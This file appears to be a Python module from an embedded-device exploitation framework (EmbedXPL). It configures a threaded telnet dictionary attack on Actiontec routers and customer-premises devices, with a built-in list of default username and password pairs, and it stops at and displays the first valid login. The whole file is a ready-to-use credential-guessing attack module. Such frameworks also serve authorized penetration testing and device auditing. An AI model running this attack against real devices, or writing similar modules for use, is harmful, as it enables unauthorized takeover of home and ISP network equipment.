# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    """Actiontec Router/CPE — Default Telnet Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Actiontec Router/CPE Default Telnet Creds",
        "description": (
            "Module performs dictionary attack with default credentials against "
            "Actiontec Router/CPE Telnet service. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "devices": (
            "Actiontec Router/CPE",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("NOLOGIN:NOLOGIN,NOLOGIN:admin,NOLOGIN:password,NOLOGIN:password1,NOLOGIN:telus", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")
